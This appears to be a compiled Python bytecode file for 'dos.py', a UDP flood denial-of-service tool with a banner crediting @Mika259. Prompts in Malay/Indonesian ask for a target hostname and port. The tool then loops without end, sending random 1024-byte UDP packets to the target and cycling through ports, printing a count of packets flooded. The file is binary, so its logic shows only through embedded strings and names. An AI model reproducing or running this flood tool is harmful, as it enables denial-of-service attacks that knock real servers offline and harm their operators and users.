�
    V�9g�  �            
       �  � d dl Z d dlZd dlZd dlZd dlmZ ej                  j                  �       Zej                  dk(  rdndZ
 ej                  e
�       dZ ee�       	  ed�      Z e ed�      �      Z ed�        ej,                  e�      Z	  ej0                  e�       dZeZ ed�        ej                  e
�        ee�        ed�        ed�        ede�de�de�dd���       edk7  r ed�        e j(                  d�       n ede� ��       	  ed�        ed�        ed�        ej                  ej:                  ej<                  �      Z ej@                  d�      Z!d Z"	 	 ejG                  e!eef�       edz   Ze"dz  Z" ede"efz  �       edk(  reZ�4# e$ rZ e j(                  d	�       Y dZ[��HdZ[we$ r  e j(                  d
�       Y ��ew xY w# ej4                  ej6                  f$ r dZY ��Zw xY w# e$ r6  ed�        ed�        ed e�d!e�d"d���        e j(                  d#�       Y ��w xY w)$�    N)�sleep�posix�clear�clsu�   _____     ______     ______     ______     ______     _____
/\  __-.  /\  __ \   /\  ___\   /\___  \   /\  ___\   /\  == \
\ \ \/\ \ \ \ \/\ \  \ \___  \  \/_/  /__  \ \  __\   \ \  __<
 \ \____-  \ \_____\  \/\_____\   /\_____\  \ \_____\  \ \_\ \_\
  \/____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/
                       ×UDP Flood Dos×
                     [Author | @Mika259]
            [Github | https://github.com/mika259]
zMasukkan Target Hostname/Ip: zMasukkan port target: zIp Address or Port is invalid!zYou exit tool..zScan ip and port 5 second...�AktifzTiada Sambungan�   z[>==[Info Server]==<]g�������?z- Domain    : z
- Status    : z
- Address   : z
- Port      : �Anyg      �?z&
Server seperti tidak hidup. Cuba lagiz- Attack at : zAttack in 5 second...�   i�  �   z$Flooding %d packets through port %d!i��  z[Connection info]zDomain    : z
Address   : z
Port      : zYou're exited tool...)$�sys�socket�datetime�os�timer   �dl�now�date�namer   �system�banner�print�input�hostname�int�min_port�	Exception�e2�exit�KeyboardInterrupt�gethostbyname�ip�gethostbyaddr�status�gaierror�herror�port�AF_INET�
SOCK_DGRAM�sock�urandom�data�sent�sendto� �    �dos.py�<module>r1      sS  �� !�  � ���������7�7�G�#���� 	��	�	�%� ��� �f�� ��4�5�H��5�1�2�3�H�
 �$� %��V���(�#����F������F� �� �1�� 	��	�	�%� � �f�� �� �r�#�w� �PX�Y_�`b�ch�i� j�	�W���s�G��C�H�H�6�7�	�N�4�&�
!�"�� �1�� �� � �1���v�}�}�V�^�^�F�$5�$5�6���r�z�z�$�����
�
+����D�2�d�)�$��a�x����	���4�d�4�[�@�A��5�=��D� ��? � /��C�H�H�-�.�.���  ��C�H�H��� �� 	������&� ��F���< � +��!�"�2�c�7����E�R�S�����(�*�+�sB   �!F" �G  �/2H �"G�'F?�?G�G� H� H�8H?�>H?